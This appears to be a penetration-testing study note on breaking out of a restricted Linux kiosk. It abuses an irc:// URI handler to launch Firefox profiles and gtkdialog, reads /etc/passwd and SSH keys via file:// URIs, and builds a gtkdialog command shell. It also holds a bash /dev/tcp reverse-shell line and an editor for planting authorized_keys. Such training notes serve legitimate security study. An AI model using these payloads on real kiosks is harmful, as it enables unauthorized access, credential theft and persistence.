---
title: Kiosk Command Execution
draft: false
tags:
  - red-team
  - offensive
  - linux
  - kiosk
  - breakout
---
 
If we are able spawn a prompt to select an application, we are able to bypass the Kiosk security restrictions:
![[Pasted image 20260714171927.png]]

---
# Filesystem enumeration

If we click on "Choose", we can see that we can browse through the filesystem:
![[Pasted image 20260714172052.png]]

We can see that the home directory is "guest" indicating the user running the Kiosk. We can also attempt to right click or middle click on the interface, icons, etc.

> [!Note]
> We could right/middle click to open a file explorer or create shortcuts to applications which we could run.

We can browse through the different folders and applications. We'll search a variety of folders that contain [Linux binaries](https://askubuntu.com/questions/27213/what-is-the-linux-equivalent-to-windows-program-files), including **/bin**, **/usr/bin**, **/usr/share**, **/sbin**, **/usr/sbin**, **/opt** and **/usr/local**.
![[Pasted image 20260714172809.png]]

We should use a common [graphical terminal emulator](https://en.wikipedia.org/wiki/Terminal_emulator) such as xterm, gnome-terminal or konsole, but they are often removed.

We can take note of other programs that might be helpful like: [**/bin/busybox**](https://busybox.net/about.html) which combines common Linux/Unix utilities into a single binary, or [**/usr/bin/dunstify**](https://wiki.archlinux.org/index.php/Dunst#Dunstify), which displays quick pop-up messages that disappear after a short period of time.

If we test the latest one, we can see that it displayed a drop-down notification with the URL we placed:
![[Pasted image 20260714173547.png]]

This is important for 2 things:
1. There is no protection mechanism that blocks external applications.
2. The URI is passed as an argument to the application we select.
```bash
dunstify irc://myhost
```

If we test something like /bin/bash, obviously it will fail:
```
kali@kali:~$ /bin/bash irc://myhost
/bin/bash: irc://myhost: No such file or directory
```

but we can bypass this by using /bin/env to set the first argument as an environment variable:
```bash
/usr/bin/env irc://myhost=something /bin/bash
```

If we test it on kali it works fine. But if we test it on the kiosks firefox y returns an error (probably due to the lack of terminal emulator programs on the system):
![[Pasted image 20260714174252.png]]

As we know, firefox works perfectly fine and also accepts the URL `irc://myhost`. We also know that firefox command line tool spawns with the URL as the first argument:
```
firefox URL
```

# Leveraging Firefox Profiles

Firefox is running in a restricted mode likely set in a specially configured profile. We may be able to break out of these restrictions by loading a different profile configuration.

Lets test it by running the following payload to open firefox with a different profile (select firefox as the running application):
```
irc://myhost -P "haxor"
```

![[Pasted image 20260714174747.png]]

We can see that it launched a new instance of Firefox with the firefox profile manager:
![[Pasted image 20260714174922.png]]

We can then create our own profile:
![[Pasted image 20260714174951.png]]

And we can see we have broken the restricted instance of firefox:
![[Pasted image 20260714175035.png]]

---
# Enumerating the System Information

In case the Kiosk was connected to the internet, we could install extensions such as terminal emulators or file browsers. We could connect to online tools such as text editors, which could help us write local files. In fact, we could even leverage highly specialized kiosk pentesting tools like [_iKAT_](http://www.ikat.kronicd.net/).

In case we are not connected to the internet, we can start by enumerating the local file system like if we where using directory traversal:
```
file:///etc/passwd
```
![[Pasted image 20260714175400.png]]

Enumerate version file:
```
file:///proc/version
```
![[Pasted image 20260714175719.png]]

Enumerate SSH keys:
```
file:///home/<user>/.ssh/
file:///home/<user>/.ssh/id_rsa
file:///home/<user>/.ssh/id_ecdsa
...
```
![[Pasted image 20260714175905.png]]

To open a file explorer, we could leverage the "show downloads" option:
![[Pasted image 20260714180056.png]]

Finally, we could interact with the Web developer tools:
![[Pasted image 20260714180315.png]]

We will start with [_Scratchpad_](https://developer.mozilla.org/en-US/docs/Tools/Scratchpad).

---
# Scratching the Surface - Simulating an Interactive Shell

Scratchpad is a built-in text editor intended for running and debugging JavaScript but can also load and save plain-text files.

We could leverage [**/usr/bin/gtkdialog**](https://code.google.com/archive/p/gtkdialog/), which builds interfaces with an HTML-style markup language (useful in case there is no other build tools such as gcc or g++)

Elements Syntaxis: [GtkDialog](https://code.google.com/archive/p/gtkdialog/wikis)

<!-- TODO(done 2026-09-24): documented three no-Scratchpad file-write primitives below. Original marker kept for traceability. -->
TODO: Find a way to write user-provided text to a file on the file system without Scratchpad. One potential option might include the JavaScript console.

> [!Note] Writing files without Scratchpad
> Scratchpad was removed in Firefox 72+, so on a modern kiosk we need other primitives to drop our `gtkdialog` markup (or an SSH key) to disk:
> 1. **Browser Console `OS.File` (privileged JS).** The *Browser Console* (`Ctrl+Shift+J`, not the page/Web Console) and the Scratchpad both run in chrome-privileged context, so the `OS.File` / `IOUtils` APIs are available and can write anywhere the kiosk user can:
> ```javascript
> // Browser Console (Ctrl+Shift+J). Older builds:
> Components.utils.import("resource://gre/modules/osfile.jsm");
> OS.File.writeAtomic("/home/guest/terminal.txt",
>     new TextEncoder().encode('<window><vbox>...</vbox></window>'));
> // Newer builds expose IOUtils directly:
> await IOUtils.writeUTF8("/home/guest/terminal.txt", "<window>...</window>");
> ```
> 2. **`data:` URI + Save As.** Navigate to a `data:` URL holding the exact markup and use the browser's *Save Page As* / download flow to write it to `/home/guest/terminal.txt` (set the filter to "All Files"), which is the download-based approach used later in this note:
> ```
> data:text/plain,<window><vbox>...gtkdialog markup...</vbox></window>
> ```
> 3. **`file://` + view-source is read-only** — it will *not* write. Use it only to confirm the file landed (`view-source:file:///home/guest/terminal.txt`).
>
> Once the markup file exists on disk, launch it with the `gtkdialog -f` payload shown below.

There is an actual [_terminal_](https://code.google.com/archive/p/gtkdialog/wikis/terminal.wiki) element for gtkdialog, but the necessary libraries might be missing:
```
The terminal (VteTerminal) widget requires a version of gtkdialog built with libvte.
```

1. Write the following code in the editor:
```
<window>
  <vbox>
    <vbox scrollable="true" width="500" height="400">
        <edit>
          <variable>CMDOUTPUT</variable>
          <input file>/tmp/termout.txt</input>
        </edit>
    </vbox>
    <hbox>
      <text><label>Command:</label></text>
      <entry><variable>CMDTORUN</variable></entry>
      <button>
          <label>Run!</label>  
          <action>$CMDTORUN > /tmp/termout.txt</action>
          <action>refresh:CMDOUTPUT</action>  
      </button>
    </hbox>
  </vbox>
</window>
```

2. Save the file at `/home/<user>/terminal.txt` and make sure to put "All Files":
![[Pasted image 20260714184202.png]]

3. Run the payload by specifying the following URI; select gtkdialog as the running application:
```
irc://myhost -f /home/guest/terminal.txt
```

4. We now have RCE:
![[Pasted image 20260714184833.png]]

<!-- TODO(done 2026-09-24): documented an improved terminal (stderr + history + Enter binding) and useful gtkdialog widgets below. Original marker kept for traceability. -->
TODO:
1. Improve the terminal, making it more effective or more reliable. Integrate standard error output.
2. Explore the other widgets and elements of gtkdialog. What other useful features can be created with it that might be useful for interacting with the system?

> [!Note] Improved gtkdialog terminal
> The original `<action>$CMDTORUN > /tmp/termout.txt</action>` swallows `stderr` and overwrites the output on every run. This version merges `stderr` into the pane, keeps a running history, and lets you submit with **Enter** instead of only the button:
> ```
> <window title="kiosk-shell">
>   <vbox>
>     <vbox scrollable="true" width="700" height="450">
>         <edit>
>           <variable>CMDOUTPUT</variable>
>           <input file>/tmp/termout.txt</input>
>         </edit>
>     </vbox>
>     <hbox>
>       <text><label>Command:</label></text>
>       <entry>
>         <variable>CMDTORUN</variable>
>         <!-- pressing Enter in the entry triggers the same actions as the button -->
>         <action>echo "\$ $CMDTORUN" >> /tmp/termout.txt</action>
>         <action>eval $CMDTORUN >> /tmp/termout.txt 2>&1</action>
>         <action>refresh:CMDOUTPUT</action>
>       </entry>
>       <button>
>           <label>Run!</label>
>           <action>echo "\$ $CMDTORUN" >> /tmp/termout.txt</action>
>           <action>eval $CMDTORUN >> /tmp/termout.txt 2>&1</action>
>           <action>refresh:CMDOUTPUT</action>
>       </button>
>       <button>
>           <label>Clear</label>
>           <action>echo -n "" > /tmp/termout.txt</action>
>           <action>refresh:CMDOUTPUT</action>
>       </button>
>     </hbox>
>   </vbox>
> </window>
> ```
> Key changes: `>>` appends (persistent history), `2>&1` captures errors, `eval` handles pipes/redirection inside the command, and echoing the command back gives a prompt-like transcript. Because `$CMDTORUN` is passed to a shell, standard tricks work — spawn a proper reverse shell to escape the kiosk entirely (see [[Shells]] and [[Privileged Escalation]]):
> ```bash
> bash -c "bash -i >& /dev/tcp/<LHOST>/4444 0>&1"
> ```
>
> **Other useful gtkdialog widgets:**
> - `<tree>` / `<list>` with an `<input>` action to render `ls -la`, `ps aux` or `/etc/passwd` as a browsable pane.
> - `<edit>` with a `<button>` that writes the buffer back with `<output file>` — a rudimentary **file editor** (see Extra Mile).
> - `<pixmap>`/`<timer>` to auto-refresh output on an interval so long-running commands stream.
> - `<fileselect>` to graphically pick files to read or exfil.

#### Extra Mile

<!-- TODO(done 2026-09-24): documented a minimal gtkdialog text editor below. Original marker kept for traceability. -->
TODO: Experiment with creating simple applications with gtkdialog to streamline the exploitation process. One potential project is a text editor based on our terminal application.

> [!Note] Minimal gtkdialog text editor
> Reusing the terminal skeleton, an `<edit>` bound to both an `<input file>` (load) and an `<output file>` (save) gives a self-contained editor — handy for planting SSH `authorized_keys`, cron entries, or new `gtkdialog` payloads without needing Scratchpad:
> ```
> <window title="kiosk-editor">
>   <vbox>
>     <edit>
>       <variable>BUFFER</variable>
>       <input file>/home/guest/notes.txt</input>
>     </edit>
>     <hbox>
>       <entry><variable>TARGET</variable><default>/home/guest/.ssh/authorized_keys</default></entry>
>       <button>
>         <label>Save</label>
>         <!-- gtkdialog writes the widget's buffer to the file named in <output file> -->
>         <action>save:BUFFER</action>
>       </button>
>     </hbox>
>   </vbox>
> </window>
> ```
> Point the `<output file>` (or the `save:` target) at a sensitive path the kiosk user can write, paste your public key, and Save — then reconnect over [[SSH]] for a stable session instead of a fragile GUI shell.

---
### Related notes
- [[Kiosk Enumeration]] — mapping the kiosk restrictions before attempting a breakout.
- [[Privileged Escalation]] — escalating once command execution is achieved inside the kiosk.
- [[Windows Kiosk Breakouts]] — the Windows-side equivalents (dialog/URI abuse).
- [[Shells]] — upgrading the gtkdialog RCE into a proper reverse shell.






